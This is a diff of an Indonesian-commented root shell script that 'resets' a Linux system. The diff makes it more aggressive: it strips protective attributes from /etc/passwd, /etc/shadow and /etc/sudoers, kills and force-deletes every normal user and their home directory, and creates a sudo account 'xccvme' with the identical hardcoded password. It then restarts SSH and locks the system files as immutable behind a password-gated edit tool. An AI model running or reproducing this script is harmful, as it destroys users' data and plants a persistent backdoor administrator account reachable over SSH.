@@ -7,29 +7,35 @@ if [ "$(id -u)" -ne 0 ]; then
 fi
 
 echo "========================================================"
-echo "   RESET USER & LOCKDOWN SYSTEM (IMMUTABLE)"
+echo "   RESET USER & LOCKDOWN SYSTEM (SUPER AGRESID)"
 echo "========================================================"
 
 # DAFTAR FILE SISTEM VITAL
 SYS_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/sudoers")
 LOCK_TOOL="/usr/bin/edit-user-config"
 
-# 1. BUKA KUNCI LAMA (JIKA ADA)
-echo "[+] Membuka kunci sistem sementara..."
+# 1. JEBOL KUNCI LAMA (FORCE UNLOCK)
+echo "[+] Menjebol kunci sistem (Unlock Attributes)..."
 for FILE in "${SYS_FILES[@]}"; do
-    if lsattr "$FILE" 2>/dev/null | grep -q "i"; then
-        chattr -i "$FILE"
+    if [ -f "$FILE" ]; then
+        # Hapus atribut i (immutable), a (append), u (undeletable), e (extent)
+        chattr -i -a -u -e "$FILE" >/dev/null 2>&1
     fi
 done
 
 # 2. HAPUS SEMUA USER NORMAL (UID >= 1000) KECUALI ROOT
-echo "[+] Membersihkan user lama..."
+echo "[+] Membersihkan user lama secara paksa..."
+# Ambil daftar user UID >= 1000 selain 'nobody'
 USER_LIST=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
 
 for USER in $USER_LIST; do
     if [ "$USER" == "root" ]; then continue; fi
-    userdel -r "$USER" >/dev/null 2>&1
-    pkill -u "$USER" >/dev/null 2>&1
+    
+    echo "    - Menghapus: $USER"
+    # Matikan paksa semua proses user tersebut (SIGKILL)
+    pkill -KILL -u "$USER" >/dev/null 2>&1
+    # Hapus user dan home directory secara paksa
+    userdel -f -r "$USER" >/dev/null 2>&1
 done
 
 # 3. BUAT USER BARU 'xccvme'
@@ -37,12 +43,14 @@ USERNAME="xccvme"
 PASSWORD="xccvme"
 
 echo "[+] Membuat user admin: $USERNAME"
+# Pastikan user belum ada atau sisa-sisa user lama bersih
 if ! id "$USERNAME" &>/dev/null; then
     useradd -m -s /bin/bash -G sudo "$USERNAME"
 fi
 
 # Set password & Group
 echo "$USERNAME:$PASSWORD" | chpasswd
+# Pastikan masuk grup admin (sudo/wheel)
 if grep -q "^sudo:" /etc/group; then
     usermod -aG sudo "$USERNAME"
 elif grep -q "^wheel:" /etc/group; then
@@ -51,7 +59,7 @@ fi
 
 echo "    ✅ User $USERNAME berhasil dibuat."
 
-# 4. RESTART SERVICE SSH
+# 4. RESTART SERVICE SSH (Agar perubahan user user efek)
 if command -v systemctl >/dev/null 2>&1; then
     systemctl restart ssh
     systemctl restart sshd
@@ -59,8 +67,8 @@ else
     service ssh restart
 fi
 
-# 5. KUNCI MATI SISTEM (IMMUTABLE)
-echo "[+] MENGUNCI FILE SISTEM (Immutable Mode)..."
+# 5. KUNCI MATI SISTEM (SUPER IMMUTABLE LOCK)
+echo "[+] MENGUNCI FILE SISTEM (+i)..."
 for FILE in "${SYS_FILES[@]}"; do
     chattr +i "$FILE"
     if lsattr "$FILE" | grep -q "i"; then
@@ -72,6 +80,9 @@ done
 
 # 6. BUAT ALAT EDIT KHUSUS (WRAPPER)
 echo "[+] Membuat alat manajemen user: edit-user-config"
+# Hapus tool lama jika ada
+rm -f "$LOCK_TOOL"
+
 cat > "$LOCK_TOOL" <<EOF
 #!/bin/bash
 SYS_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/sudoers")
@@ -100,7 +111,7 @@ echo ""
 
 if [ "\$MYPASS" == "xccvme" ]; then
     echo "🔓 Password Benar. Membuka kunci..."
-    for F in "\${SYS_FILES[@]}"; do chattr -i "\$F"; done
+    for F in "\${SYS_FILES[@]}"; do chattr -i -a -u -e "\$F"; done
     
     echo "📝 Membuka NANO..."
     nano \$TARGET
